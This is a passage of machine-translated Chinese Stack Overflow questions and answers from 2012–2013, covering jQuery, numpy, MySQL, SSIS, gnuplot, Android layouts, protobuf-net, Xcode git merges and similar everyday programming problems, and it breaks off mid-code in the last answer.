* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-08-05T10:44:39.763

对于其他搜索的人，我有一个不同的问题。我为退出 ipa 所遵循的手动步骤导致它没有任何权利，这意味着没有钥匙串访问权限。因此，我创建了一个脚本来退出 ipa，但保留原始权利。我将它发布在[http://baltaks.com/2013/08/resigning-enterprise-ios-apps](http://baltaks.com/2013/08/resigning-enterprise-ios-apps)并会在需要时保持更新。

# java-me - j2me lwuit list 采用相同的单元格背景

> ID：13313716
> 
> 赞同：0
> 
> 时间：2012-11-09T18:17:12.983
> 
> 标签：java-me, lwuit, nokia-s40

我正在制作一个列表，其中包含人和每个人的评分作为单元格背景，该列表为每个单元格提供相同的评分背景，但是当向上或向下滚动列表时，我正在拖动的单元格采用它的真实速率背景，但其他单元格保持相同速率的背景图像我正在使用诺基亚 s40 全触摸模拟器这是我用于单元格渲染器的代码

```
 list.setRenderer(new ListCellRenderer() {

        public Component getListFocusComponent(List list) {
            // TODO Auto-generated method stub
            return null;
        }

        public Component getListCellRendererComponent(List list,
                Object value, int index, boolean isSelected) {
            String rate = "";

            rate = Transportation.getDriverRate(value.toString(),
                    CityListForm.selectedCity);
            rate = (Integer.parseInt(rate)) > 25 ? "" + 5 : ""
                    + Integer.parseInt(rate) / 5;
            rate = "/" + rate + ".png";
            Image image = null;
            Label label = null;
            try {

                image = (Image.createImage(rate));
                System.out.println(rate);
            } catch (IOException e) {
                e.printStackTrace();
            }
            label = new Label();

            label.getStyle().setBgImage(image);
            label.setText(value.toString());
            label.getStyle().setAlignment(RIGHT);
            label.setTextPosition(RIGHT);
            Style style = label.getStyle();
            style.setBgColor(16777215);
            style.setFgColor(0);

            label.setPreferredH(42);
            return label;
        }
    }); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T04:50:33.323

采用`List.setMutableRendererBackgrounds(true);`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-19T22:40:18.013

thnx 的答案我通过制作一个容器并在其中对接两个标签来解决它，一个用于值，另一个用于速率图标，并为容器提供布局并在 getListCellRendererComponent() 方法中返回容器

# javascript - window.scrollTo 在 IOS 的 phonegap 中不起作用

> ID：13313721
> 
> 赞同：1
> 
> 时间：2012-11-09T18:17:28.987
> 
> 标签：javascript, jquery, cordova, ios6

我打电话给：

```
window.scrollTo(0,this.stateModel.get("scrollY")); 
```

在视图的渲染函数中的 phonegap 中。

此代码适用于 android 模拟器，但不适用于 iPhone 6.0 模拟器。

是否有任何理由 scrollTo 不能在 IOS 上运行？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T19:38:52.707

我也有这个问题。作为一种解决方法，我只是在所需位置创建了一个锚元素，然后在隐藏的锚链接上调用一个点击事件。

```
<a class="anchor" href="#desiredLocation" style="display: none;"></a>
<a id="desiredLocation"></a> 
```

jQuery 代码...

```
$(".anchor").click(); 
```

不是最优雅的解决方案，但它提供了相同的行为。

# jquery - 带有函数的Jquery动画不会排队：false

> ID：13313724
> 
> 赞同：7
> 
> 时间：2012-11-09T18:17:35.213
> 
> 标签：jquery, jquery-animate, queue

我在使用以下代码时遇到问题：

```
$(".active").animate({
            opacity:0
        },{queue: false, duration:1000}, function(){  
            console.log("queue??");
            $(".active").css('display', 'none');
            $(".active").removeClass("active");
            initiatePage();
        }); 
```

添加后`queue: false`，它`function()`根本没有运行......但如果我不运行，他们只会排队，我也不希望这种情况发生......有没有办法制作这个动画以及一切都随之而来`queue: false`??

让我知道我是否可以提供任何让您更容易帮助的东西。

谢谢！

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-11-09T18:19:59.230

阅读[animate()](http://api.jquery.com/animate/)手册。使用`options`回调时应使用`complete`选项传递。

> 完成：动画完成后调用的函数。

```
$(".active").animate({opacity:0},{
    queue       : false,
    duration    : 1000,
    complete    : function() {  
        $(this).hide().removeClass('active');
        initiatePage();
    }}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-10T07:24:10.930

使用核心插件[jquery-timing](http://creativecouple.github.com/jquery-timing/)您可以缩短解决方案：

```
$(".active").animate({opacity:0},{queue:'foo', duration:1000})
    .join('foo').hide().removeClass('active').then(initiatePage); 
```

在 jQuery 链中使用[.join()可以解决问题。](http://creativecouple.github.com/jquery-timing/api/animate/.join.html)

# python - Quickfix 会自动填写标题、正文和结尾字段吗？

> ID：13313730
> 
> 赞同：3
> 
> 时间：2012-11-09T18:18:20.860
> 
> 标签：python, quickfix

当想要发送 Quickfix 消息（例如登录）时，我是否需要手动填写*每个*字段，或者是否会根据需要自动添加来自设置文件的数据。

目前，我可以连接但无法登录到我的经纪人的 FIX 服务器，而且我无法知道自己做错了什么。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T18:24:53.637

`start`当您从发起程序调用时，QuickFix 将自动连接并发送登录信息。至于无法联系到您的经纪人，请让他们确认他们可以看到您的登录请求。另外，请确保它们不需要额外的字段，例如密码或*SubID*。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-10T10:34:17.077

QuickFIX 填写 QuickFIX 设置/配置文件中的字段。因此，当 QuickFIX 处理连接时，TargetCompID、SenderCompID、Host 等内容都会自动填写。有关可以在此处填写哪些字段的更多详细信息，请参阅[配置指南。](http://www.quickfixengine.org/quickfix/doc/html/configuration.html)尽管您可以向该文件添加字段，但 quickFIX 引擎不会自动填写这些字段。您将需要覆盖该`toAdmin`方法才能向消息中添加其他字段。

当您覆盖该`toAdmin`方法时，您将需要检查消息类型。如果消息对象的工作方式与 Java 中的相同，您将需要获取消息头并检查消息头中的消息类型字段，因为它不在消息正文中。

# mobile - 移动端与桌面端的高度差异

> ID：13313733
> 
> 赞同：2
> 
> 时间：2012-11-09T18:18:25.460
> 
> 标签：mobile, height, desktop

我正在尝试将 iframe 嵌套在 div 中，以通过固定 div 的高度来固定 iframe 的高度。我的问题是桌面浏览器上显示的 iframe 数量与移动浏览器（iOS 的 Safari 和 chrome）上显示的数量不同。就像手机上的 3em 不等于桌面上的 3em

下面是 div/iframe html：

```
<div name="iframe-div" style="height:3em; overflow:hidden; font-size:12px">
<iframe src="http://blog.mycitylives.com/2012/02/twn-links/" frameborder="0" scrolling="no" " width="90%" height="810px">
</iframe>
</div> 
```

它显示在上面的 iframe src 链接上。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T18:35:18.723

'em' 单位是相对度量，字面意思是字体类型和字体大小的 'm' 字符的宽度/高度。所以，我希望手机的尺寸自然小于台式机。iframe 页面的 css 内部也可能导致冲突。

尝试改用像素或百分比。

# android - 无法切换到下一个屏幕

> ID：13313737
> 
> 赞同：0
> 
> 时间：2012-11-09T18:18:36.413
> 
> 标签：android, jquery, html, cordova

我正在制作一个应用程序并且我有一个索引。我怎样才能转到我的另一个屏幕，以便它也可以工作？我的另一个屏幕在 components.html 中，但是当它更改屏幕时，我的另一个屏幕中的过程不起作用。但是当我单独打开另一个屏幕时它可以工作。所以我不知道问题是什么。

```
 <!DOCTYPE html>
    <html>
    <head>
    <title>Receta</title>
      <meta charset="utf-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="stylesheet" href="themes/receta.min.css" />
         <link rel="stylesheet" href="themes/receta.css" />
      <link rel="stylesheet" href="css/jquery.mobile.structure-1.1.0.min.css" /> 
      <script src="js/jquery-1.7.1.min.js"></script> 
      <script src="js/jquery.mobile-1.1.0.min.js"></script> 
      <script type="text/javascript" charset="utf-8" src="js/cordova-1.8.1.js"></script>
      <script type="text/javascript" charset="utf-8" src="js/cuenta.js"></script>  

      </head>
      <h1><center>RECETA</h1>
      <!DOCTYPE html>
    <body>

    <button onclick="myFunction('Persona','Recetario')">Bienvenido</button>

    <script>
    function myFunction(name,job)
    {
    alert("Bienvenida " + name + ", puede comenzar a crear su " + job);
    }
    </script>

    </body>

    <form action="/html/tags/html_form_tag_action.cfm" method="get">
    <fieldset>
    <legend>Detalles</legend>
    <div>
    <label for="receta">Nombre Receta:</label><br>
    <input type="text" name="receta" value="" maxlength="20" /><br>
    </div>
    </fieldset>

    </form>

      </html>

--------------------------------------------------

<!DOCTYPE html>
    <html>
      <head>
    <title>Ingredient</title>
      <meta charset="utf-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="stylesheet" href="themes/receta.min.css" />
       <link rel="stylesheet" href="themes/receta.css" />
     <link rel="stylesheet" href="http://code.jquery.com/mobile/1.1.1/jquery.mobile-1.1.1.min.css" />
    <script src="http://code.jquery.com/jquery-1.7.1.min.js"></script>
    <script src="http://code.jquery.com/mobile/1.1.1/jquery.mobile-1.1.1.min.js"></script>
      <script src="js/recetas.js">  </script>  
</head><body>
      <h1>INGREDIENTES</h1>
    <ul>

    </ul>
    <select onchange="selectIngredient(this);">
     <option value="Cheese">Cheese</option>
     <option value="Olives">Olives</option>
     <option value="Pepperoni">Pepperoni</option>
     <option value="Milk">Milk</option>
    </select>
</body>

      </html> 
```

* * *

```
 (recetas.js)

function selectIngredient(select)
    { 
      var $ul = $(select).closest('.ui-select').prev('ul');
console.log($ul[0])
  if ($ul.find('input[value=' + $(select).val() + ']').length == 0) {
    console.log('s')
        $ul.append('<li onclick="$(this).remove();">' +
          '<input type="hidden" name="ingredients[]" value="' + 
          $(select).val() + '" /> ' +
          $(select).find('option:selected').text() + '</li>');
  }
    } 
```

# python - 通过迭代列表在python中生成一个三维数组

> ID：13313738
> 
> 赞同：5
> 
> 时间：2012-11-09T18:18:36.380
> 
> 标签：python, arrays, multidimensional-array, numpy

鉴于我的知识水平（或缺乏），我很欣赏这项任务可能有点雄心勃勃，但仍然如此。

我有一个包含 16 个字符串的列表，大约 3000 个项目长，其中每个字符表示另一个数字列表。不知道我是否说清楚了；它实际上是一个 16 个氨基酸长肽的列表，其中每个氨基酸（20 个中的 1 个）可以用 5 个数字表示。

我想遍历该列表（肽），然后为每个字符（氨基酸）添加相关的 5 个数字（如果你有兴趣，Atchley 因子）到一个数组，制作一个 3 维数组，我的轴是：肽（3000）x该肽中的氨基酸（16）x因子（5）的实例。

我难以置信地超出了我的深度，所以我不确定我所拥有的是否有用，但这里是（使用 numpy）：

```
array = np.empty(shape=(len(peptides),16,5)

for i in peptides:

    for j in str(i): 
```

（在这一点上，我在论坛上搜索了很多不同的东西，最后得到了一些类似的东西，但我敢肯定，我什至错过了我在这里的目标）

```
 if j == 'A':    
            L16Afctrs = np.append([-0.59145974, -1.30209266, -0.7330651, 1.5703918, -0.14550842], axis=1)
    elif j == 'C':
            L16Afctrs = np.append([-1.34267179, 0.46542300, -0.8620345, -1.0200786, -0.25516894], axis=1)
    ...
    elif j == 'Y':
            L16Afctrs = np.append([0.25999617, 0.82992312, 3.0973596, -0.8380164, 1.51150958], axis=1) 
```

就像我说的那样，我真的很挣扎，任何帮助将不胜感激。

**编辑：澄清（希望）**

我有一个大约 3000 个不同的 16 个字符串的列表，其中这些字符串中的每个字符表示另外 5 个数字。

我想生成一个 3 维数组或结构，由此我可以（最终）通过查看 3 维数组中的给定平面（我设想的维度是；原始字符串 x 16 个字符 x 5 个因子）。

我目前正在制作与@Winston 的帖子相关的不同字符的字典，然后尝试将其折叠成 3d 数组。

**编辑2：成功！**

温斯顿的修复效果很好！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T18:51:47.337

将数据存储在字典中：

```
DATA = {
    'A' : numpy.array([-0.59145974, -1.30209266, -0.7330651, 1.5703918, -0.14550842]),
    'B' : numpy.array([-1.34267179, 0.46542300, -0.8620345, -1.0200786, -0.25516894]),
    'D' : numpy.array([1.05015062, 0.30242411, -3.6559147, -0.2590236, -3.24176791])
    ...
} 
```

使用 python 列表推导来构建所有这些列表，然后让 numpy 将该列表转换为 numpy 数组

```
counters = numpy.array([DATA[letter] for peptide in peptides for letter in peptide]) 
```

将数组重塑为您的 3D 尺寸，因为最后一步将有 2D 数组

```
counters = counters.reshape( len(peptides), 16, 5 ) 
```

# sql-server - 如何确定 SSIS 包 (.dtsx) 是由 BIDS 2005 还是 2008 创建的？

> ID：13313739
> 
> 赞同：3
> 
> 时间：2012-11-09T18:18:39.283
> 
> 标签：sql-server, ssis

是否有确定的方法来确定 .dtsx 文件是使用 BIDS 2005 还是 BIDS 2008 创建的？

如果需要知道，我将使用 BIDS 2008 打开软件包。但我想事先知道它是否最初是通过 BIDS 2005 创建的。想象一下，我没有文档，我将负责记录我们拥有的大量 SSIS 包。感谢您的任何帮助！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-09T18:26:58.430

是的。`DTS:Name="PackageType"`在您的 DTSX 中有一个。将您的值与 MSDN 中的枚举进行比较：http: [//msdn.microsoft.com/en-us/library/microsoft.sqlserver.dts.runtime.dtspackagetype.aspx](http://msdn.microsoft.com/en-us/library/microsoft.sqlserver.dts.runtime.dtspackagetype.aspx)

A`<DTS:Property DTS:Name="PackageType">5</DTS:Property>`表示 2008 年投标。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-09T18:38:27.730

```
select    cast(BulkColumn as XML)
from    openrowset(bulk 'C:\temp\Neues Paket.dtsx',
                        single_blob) as pkgColumn; 
```

我不确定

2008年

DTS:Property DTS:Name="PackageFormatVersion"3/DTS:Property DTS:ExecutableType="SSIS.Package.2

2005年

DTS:Property DTS:Name="PackageFormatVersion"2/DTS:Property DTS:ExecutableType="MSDTS.Package.1

# php - MD5 重复条目 mySQL

> ID：13313744
> 
> 赞同：0
> 
> 时间：2012-11-09T18:19:00.343
> 
> 标签：php, mysql, md5

当涉及到单个 mySQL 脚本时，我遇到了一些问题；具体来说，mySQL 不断给我这个错误：

`MySQL Error: Duplicate entry '39835a3f63f222c9bf51d9dd471b90bc' for key 'PRIMARY'`

这很奇怪，因为有问题的主键是基于 php 的 time() 函数的 MD5 生成的哈希，所以应该没有任何问题。

这是插入到表中的 php 代码：

```
INSERT INTO log
    (hailID, timestamp, lat, lng, phone, device, method, serviceType, email, address, languageID, ipaddress)
        VALUES
    (MD5('" . $time . $data['phone'] . "'),
     '$time',
     '".$data['lat']."',
     '".$data['lng']."',
     '".$data['phone']."',
     '".$data['device']."',
     '".$data['method']."',
     '".$data['serviceType']."',
     '".$data['email']."',
     '".$data['address']."',
     '".$data['languageID']."',
     '".$_SERVER["REMOTE_ADDR"]."' 
```

`$time`在这种情况下，它只是一个保存`time()`函数值的变量。有趣的是，这个问题不是很频繁，而且似乎是随机的（至少据我所知）。是的，所有数据`mysqli_escape_string()`在进入`$data`阵列之前都会使用它进行清理。我还使用检查了我的表`CHECK TABLE`，也没有出现任何错误。

有任何想法吗？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-09T18:26:00.133

如果在同一秒内记录了 2 个条目，它们将具有相同的哈希值。即使在使用率相当低的系统上，这种情况也会比您想象的更频繁。我会建议：

1.  取消哈希。将当前时间存储为`DATETIME`或`TIMESTAMP`使用`NOW()`。你实际上会有一个可排序的表。
2.  在日志文件中使用代理键，即`INT`with`AUTO_INCREMENT`
3.  如果您需要存储准确、唯一的时间并避免重复，请查看 PHP 的[`microtime()`](http://ca2.php.net/manual/en/function.microtime.php)函数。

想想看，即使您将 ID 存储为 8 字节，它仍然比存储 MD5 散列所需的 ID`BIGINT`小 4 倍。`VARCHAR(32)`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T18:22:59.520

好吧，您有时会遇到两次 MD5 哈希相同的情况。特别是如果（在您的情况下） sb 在一秒钟内两次添加相同的电话号码 - 生成的哈希值肯定是相同的。为什么不使用自动递增主键？

# mysql - MySQL，将 AUTO_INCREMENT 传递给另一个表

> ID：13313746
> 
> 赞同：1
> 
> 时间：2012-11-09T18:19:01.637
> 
> 标签：mysql, sql

由于另一个问题得到了正确的回答，并且我有了解决问题的新想法（这与下面的情况不太一样），我开始了一个新线程。

同样的例子， cds.id 是 AUTO_INCREMENT 并且这两个表实际上没有任何关系，有没有办法将生成的 id 发布到语言表中？

```
Table for CDs (cds):
id | type
-----------------------
1  | CD  
2  | LP  
3  | CD  

Table for names:
cd_id | language | name
-----------------------
1     | fi       | AAA
1     | de       | AAACHTUNG
3     | en       | CCC 
```

现在 SELECT 真的很简单，结构也更好，如果我现在有用于创建 CD 的表格，比如

```
<input... > = the name -> 'best of XX'
<select...> = language -> 'en'
<select...> = type     -> 'CD' 
```

我做了一个帖子，我怎样才能做多个插入？这些表的插入应该是......

```
INSERT INTO cds ('', 'CD');
INSERT INTO languages ('*the generated id in table above*', 'en', 'best of XX'); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-09T18:23:19.177

MySQL[`LAST_INSERT_ID()`](http://dev.mysql.com/doc/refman/5.0/en/information-functions.html#function_last-insert-id)返回`AUTO_INCREMENT`最新的值`INSERT`。

```
INSERT INTO languages (LAST_INSERT_ID(), 'en', 'best of XX'); 
```

大多数语言都有这个函数的包装器。例如，在 PHP 中它是[`mysqli_insert_id()`](http://www.php.net/manual/en/mysqli.insert-id.php).

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T18:24:22.753

尝试

```
INSERT INTO languages (last_insert_id(), 'en', 'best of XX'); 
```

[Last_Insert_Id](http://dev.mysql.com/doc/refman/5.0/en/information-functions.html#function_last-insert-id)获取自动生成的 id 列的最后一个自动增量值

# gnuplot - gnuplot，绘制一段时间内的单个事件

> ID：13313747
> 
> 赞同：3
> 
> 时间：2012-11-09T18:19:31.963
> 
> 标签：gnuplot

我有一些来自日志文件的数据。我想绘制一个时间段内发生错误的次数。

例如：

```
09:00:01，error_1，等等等等
09:00:10，error_1，等等等等
09:00:23，error_1，等等等等
09:01:10，error_2，等等等等
09:07:01，error_1，等等等等
09:07:43，error_1，等等等等
09:11:03，error_1，等等等等
09:18:10，error_1，等等等等
09:40:57，error_2，等等等等
09:41:23，error_1，等等等等
...
23:32:20 错误_1

```

因此，通过上述内容，我想绘制这些值，以便我可以显示一个星期，其中各个点以小时为间隔，并显示该小时的“error_1”总和......希望这是有道理的。

如果有人可以帮助我，将不胜感激！如果有办法完全用 gnuplot 做到这一点，那就更好了。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T20:33:15.690

您正在寻找让 gnuplot 进行分箱以制作[histogram](https://stackoverflow.com/questions/2471884/histogram-using-gnuplot)。唯一的技巧是您需要根据错误代码过滤掉行。您*可能可以在**gnuplot*中进行过滤，但使用类似`grep`.

```
set xdata time
set timefmt '%H:%M:%S'
set datafile sep ','
binwidth = 3600  #3600 seconds in an hour.
bin(x,width) = width*floor(x/width)
plot for [ERR in "error_1 error_2"] sprintf('<grep %s test.dat',ERR) u (bin($1,binwidth)):(1.0) smooth freq w boxes ti ERR 
```

# asp.net - 有没有办法限制 ASP.NET 3.5 进程的最大内存大小？

> ID：13313752
> 
> 赞同：0
> 
> 时间：2012-11-09T18:19:58.453
> 
> 标签：asp.net, .net, memory

我有几个 ASP Dot.Net 网站，我希望限制它们的最大内存。有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T18:22:53.563

您可以更改应用程序池设置并将**Private Memory Limit (KB)**和**Virtual Memory Limit (KB)**设置为您想要限制应用程序的内存。当达到该配额时，应用程序池将回收。

检查[这个](http://www.microsoft.com/technet/prodtechnol/WindowsServer2003/Library/IIS/f4e96b27-189c-491f-a941-fec28f5cead1.mspx?mfr=true)如何改变这两个

# java - ScrollView 剪切 TextView 中的文本

> ID：13313762
> 
> 赞同：3
> 
> 时间：2012-11-09T18:20:29.713
> 
> 标签：java, android, scrollview

我的 ScrollView 布局有问题：

```
<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent" 
    android:layout_height="fill_parent">

    <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
        android:layout_width="match_parent"
        android:layout_gravity="center_horizontal|center_vertical"
        android:id="@+id/editRelativeLayout"
        android:layout_height="match_parent"
        android:orientation="vertical" >

        <TextView
            android:id="@+id/textView2"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:textAppearance="?android:attr/textAppearanceSmall" />

        <TextView
            android:id="@+id/typeTextView"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:gravity="center"
            android:text="Large Text"
            android:textAppearance="?android:attr/textAppearanceLarge" />

    </LinearLayout>
</ScrollView> 
```

问题是当我在 TextView 中显示大量文本时，TextView2 消失了……知道如何解决吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-09T18:42:50.737

我已经解决了删除线的问题：

```
android:layout_gravity="center_horizontal|center_vertical" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-07-15T21:59:50.350

当我偶然发现同样的问题时，我找到了一个解决方案，可以让您保持文本居中但避免剪切错误：

```
<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"         // Automatic ScrollView height
            android:layout_gravity="center_vertical">    // Center ScrollView vertically

        <TextView android:layout_width="fill_parent"
                  android:layout_height="wrap_content"
                  android:gravity="center_horizontal" /> // Center TextView content horizontally

</ScrollView> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-09T18:38:18.327

更改为`android:layout_height`_`LinearLayout``wrap_content`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-09T19:11:19.987

我知道如果您正在制作 EditText 框，则可以选择使其成为 multiLine ，这样如果它们溢出框，它将随之滚动。我相信对于 TextView 有一个类似的选项；在 android xml 创建器的属性方面，应该有一个属性可以帮助您显示而不会被切断。是的应该是wrap_content。

# objective-c - 重写以加载 NSDocument 的多个文件的方法

> ID：13313763
> 
> 赞同：1
> 
> 时间：2012-11-09T18:20:29.827
> 
> 标签：objective-c, cocoa, nsdocument

我有一个 nsdocument 子类，它处理二进制文件（现有格式，而不是我创建的）的加载。文件格式为每个逻辑“文档”（具有不同的扩展名）使用 3 个具有相同名称的文件。

我希望能够让用户在 NSOpenPanel 中选择 3 个文件，然后创建一个 NSDocument 子类及其相应的窗口。我知道如何设置一个面板以允许选择多个文件，但我不知道如何进入 NSDocumentController 正在使用的面板，也不知道如何覆盖从多个文件中加载二进制数据的方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-10T03:24:46.847

依靠用户做一些独特的正确方法来解决你的应用程序自身的限制肯定会失败。无论您告诉用户做什么，他们都会这样做，与此相反，以及与之正交的所有内容。

我会在我的 plist 中声明这三种类型中的每一种，并将它们全部路由到同一个文档类。该文档将从所有三个文件中读取，无论它是使用哪个文件创建的，如果其中任何一个文件丢失，则返回错误。您可能应该指定三个文件中的一个作为文档的主文件，将您`fileURL`的 URL 设置为该文件的 URL。

注意正确实现文件协调（您应该是所有三个文件的演示者并协调任何写入其中任何一个的尝试）。如果您不这样做，您将使用户面临数据损坏或丢失的风险。

您根本不应该尝试弄乱“打开”面板。“打开”面板并不是在基于文档的应用程序中打开文档的唯一方法。你需要做的事情，你需要在你的 GUI 后面做，而不是在它里面。

如果您的应用程序被沙盒化，这将是棘手的或不可能的。安全范围的 URL 书签可以在这里为您提供帮助。

# c# - 通过 ASP.NET MVC 和 C# 询问其他网站

> ID：13313764
> 
> 赞同：0
> 
> 时间：2012-11-09T18:20:33.303
> 
> 标签：c#, asp.net-mvc, web-services, http, web-applications

我想知道如何在网站中实现一个功能，要求其他网站提供结果，然后保留这些结果并进行比较或显示。例如，如果提供产品的网站没有用于外部应用程序的 API，我如何在没有人工活动的情况下通过自动化系统在其中进行搜索？简而言之，我要实现的功能是一个微型搜索引擎，它只限于某些网站，而不是整个网络。你有想法吗？有必要研究任何一个外部网站以及其中每个搜索页面所要求的方法吗？

谢谢，最好的问候。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T18:24:39.097

您正在寻找的术语是“屏幕抓取”。如果站点没有 API，您的主要选择是以编程方式复制用户 Web 浏览器发出的相同请求，然后从响应中返回的 HTML 中提取您需要的内容。由于客户端跨域请求受到大多数浏览器的限制，因此您需要在服务器端执行此操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T18:23:53.737

您可以将目标站点拉入流中并解析出所需的信息。这是一种丑陋的方法，但是根据提供的信息，我不确定您还能如何尝试。

# c#-4.0 - protobuf-net 中没有为 System.Version 定义序列化程序

> ID：13313769
> 
> 赞同：6
> 
> 时间：2012-11-09T18:21:04.007
> 
> 标签：c#-4.0, protobuf-net

更新到最新的 protobuf-net (2.0.0.601) 后，我现在在尝试序列化 System.Version 类型的值时遇到异常。

```
[ProtoContract(SkipConstructor=true)]   
public class ServerLoginInfo
{
    [ProtoMember(1)]
    public Version ServerVersion { get; set; }
} 
```

这过去在 2.0.0.480 中可以正常工作，而无需做任何特别的事情。

是否有可能让它在新版本中工作，或者是我回滚到旧版本的唯一选择？

（我还需要序列化/反序列化与旧的 protobuf-net 版本向后兼容。）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-09T19:36:13.310

我怀疑这与 AllowParseableTypes 有关 - 即它是否寻找静态 Parse 方法作为后备。如果我记得，这不能在*默认*模型上启用，但我想我会在下一次部署中删除该限制。但现在：

```
var model = TypeModel.Create();
model.AllowParseableTypes = true; 
```

然后存储模型（并重用它），并使用model.Serialize/model.Deserialize。

如果我更改此默认模型限制，则只需：

```
RuntimeTypeModel.Default.AllowParseableTypes = true; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2016-09-02T20:13:59.540

我建议改为使用 Version 的代理项，因为启用 AllowParseableTypes 选项可能会产生禁用适用于 AllowParseableTypes 的其他类型的某些配置的副作用。

更多细节在这里： [https ://github.com/mgravell/protobuf-net/issues/183](https://github.com/mgravell/protobuf-net/issues/183)

为此，请添加以下初始化程序：

```
RuntimeTypeModel.Default.Add(typeof(Version), false).SetSurrogate(typeof(VersionSurrogate)); 
```

和以下类型：

```
[ProtoContract]
public class VersionSurrogate
{
    [ProtoMember(1)]
    public string Version { get; set; }

    public static implicit operator VersionSurrogate(Version value)
    {
        return new VersionSurrogate
        {
            Version = value.ToString()
        };
    }

    public static implicit operator Version(VersionSurrogate value)
    {
        return System.Version.Parse(value.Version);
    }
} 
```

# xcode - XCode git pull 之后的工作流程混乱

> ID：13313777
> 
> 赞同：0
> 
> 时间：2012-11-09T18:21:29.603
> 
> 标签：xcode, git, git-pull

我以前使用过其他 DVCS 系统，但我是 git 新手。所以我认为我对如何按照我的意图使用它有错误的假设。

我有一个 RepoA，它有一个 master 和 development 分支，我在其中完成大部分工作。不久前，我从 RepoA 中克隆了 RepoB 以开始研究“BigFeatureA”，并在开发分支中也这样做了。我还没有完成 BigFeatureA，但我想带来自我进行克隆以来在 RepoA 中所做的所有更改，以便我继续使用最新的代码在 BigFeatureA 上工作。（目前在 RepoA 中，develop 和 master 分支是相同的，但当然，有时它们不是。）使用在 RepoB 中工作的 XCode，我从 RepoA 开发分支中提取了一个。我遇到了冲突，解决了它，启用了拉动按钮，然后进行了拉动。

现在在 RepoB 中，带来的所有更改都是“未提交的更改”，文件显示为“M”或已修改。因此，没有任何提交消息或任何东西来自 RepoA，只是源代码发生了变化。这不是我所期望的。这只是 XCode 版本的 git 工作流还是 git merge 的工作方式？

我的最终工作流程是在 BigFeatureA 完成后将 RepoB 推送到 RepoA。这样做和走向另一个方向，即：在 RepoA 和从 RepoB 拉动之间有区别吗？

（进一步阅读表明我可能应该在 RepoB 中创建一个“BigFeatureA”分支，然后在其中的开发分支上从 RepoA 拉取，然后从 BigFeatureA 分支合并到开发分支。这样做会有所不同分支与回购之间的合并？）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T18:40:26.933

不，这不是预期的行为。将所有更改保留为已修改文件的原因是因为它已“放弃”合并。

在发布时我不知道的信息是相关的 -> 我创建了最初不知道将 .DS_Store 放入 .gitignore 文件的存储库。我在那里有 *.DS_Store 很长时间了，但我可能在这样做之后没有正确清理。看起来存储库中有“许多” .DS_Store 文件，并将其放入 .gitignore 文件似乎只是意味着“从现在开始”，而不是“从我之前所做的”。

所以在上面，Xcode 抱怨 .DS_Store 文件被修改了，因为它不知道如何解决该类型文件中的冲突，所以它就放弃了。它没有处理文件已在 RepoA 中删除的事实，它也需要在 RepoB 中删除。其次，虽然它在文件列表中显示 .DS_Store，但它不是主文件夹中的 .DS_Store，它是文件层次结构中某处的一个或多个 .DS_Store 文件。因此，无论我通过命令行删除 git 中的顶级 .DS_Store 多少次，Xcode 都不会高兴。所以我不知道它在谈论*哪个.DS_Store 文件。*看起来 Xcode 不适合在您的项目中拥有多个同名文件。

修复方法是关注另一个[SO 帖子](https://stackoverflow.com/questions/107701/how-can-i-remove-ds-store-files-from-a-git-repository)，您可以在其中找到层次结构中的所有 .DS_Store，将它们 git rm 然后通过命令行 git commit all。然后 Xcode 合并将完成，您将不会留下从拉取中修改过的文件。

# python - Python 3.2 替换文本文档中具有一定长度的所有单词？

> ID：13313778
> 
> 赞同：-1
> 
> 时间：2012-11-09T18:21:33.783
> 
> 标签：python, string, python-3.2

我需要用不同的单词替换文本文档中长度为 4 的所有单词。

例如，如果文本文档包含短语“我喜欢吃非常热的汤”，那么“喜欢”、“非常”和“汤”将被替换为“某物”

然后，它不需要覆盖原始文本文档，而是需要使用更改后的短语创建一个新文档。

这是我到目前为止所拥有的：

```
def replacement():  
    o = open("file.txt","a") #file.txt will be the file containing the changed phrase
    for line in open("y.txt"):  #y.txt is the original file
        line = line.replace("????","something")  #see below
        o.write(line + "\n")
    o.close() 
```

我试过改变“？？？？” 类似于

```
(str(len(line) == 4) 
```

但这没有用

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T18:29:28.757

```
with open('file.txt', 'a') as write_file:
    with open('y.txt') as read_file:
